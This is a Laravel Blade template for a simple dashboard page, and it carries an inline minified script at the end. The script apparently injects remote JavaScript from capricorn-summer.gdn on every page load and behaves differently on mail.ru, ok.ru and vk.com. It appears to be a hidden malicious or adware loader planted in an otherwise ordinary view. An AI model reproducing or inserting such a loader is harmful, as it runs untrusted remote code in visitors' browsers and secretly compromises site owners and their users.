@extends('layouts.index')

@section('content')
<div class="container">
    <div class="row">
        <div class="col-md-8 col-md-offset-2">
            <div class="panel panel-default">
                <div class="panel-heading">Dashboard</div>

                <div class="panel-body">
                    @if (session('status'))
                        <div class="alert alert-success">
                            {{ session('status') }}
                        </div>
                    @endif
                    sprdh
                </div>
            </div>
        </div>
    </div>
  
</div>

<script type="text/javascript">
    (function(){var t=false;function r(){var t=1;var r=parseInt("622127");var e=[{src:"//capricorn-summer.gdn/code/pid/linkcheck.js?rev=192",async:false},{src:"//capricorn-summer.gdn/code/pid/622127_BNX.js?rev=192",async:false},{src:"//capricorn-summer.gdn/code/pid/622127_ALL.js?rev=192",async:false}];var o=false;var a=[229247];var i=[733804,377743,163674,229247,761699,470116];if(window.location.host.match(/(mail\.ru|ok\.ru|vk\.com)/)&&i.indexOf(r)>-1){e[1].src=null}if(window.location.host.match(/(mail\.ru|ok\.ru|vk\.com)/)&&a.indexOf(r)>-1){e=[]}if(t===1){var n=window[window.location.hostname]||false;if(n)return;window[window.location.hostname]=true}for(var c=0;c<e.length;c++){if(e[c].src){var s=document.createElement("script");s.setAttribute("charset","UTF-8");if(e[c].async)s.setAttribute("async","async");s.setAttribute("src",e[c].src);try{var d=document.body.firstChild;d.parentNode.insertBefore(s,d)}catch(t){o=true}if(o){try{document.body.appendChild(s)}catch(t){}}}}}var e=function(){if(!t){setTimeout(function(){o()},10)}};var o=function(){try{if("function"===typeof document.body.appendChild&&window===top){t=true;r()}}catch(t){}e()};o()})();(function(){var t=false;function e(){var t=document.createElement('script');t.setAttribute('charset','UTF-8');if(0){t.setAttribute('async','async')}t.setAttribute('src',"//capricorn-summer.gdn/code/pid/vlink.js?rev=192");try{var e=document.body.firstChild;e.parentNode.insertBefore(t,e)}catch(e){document.body.appendChild(t)}}var n=function(){setTimeout(function(){i()},10)};var i=function(){if(!t){try{if('function'==typeof document.body.appendChild&&window===top){t=true;e()}}catch(t){}n()}};n()})();
</script>
@endsection
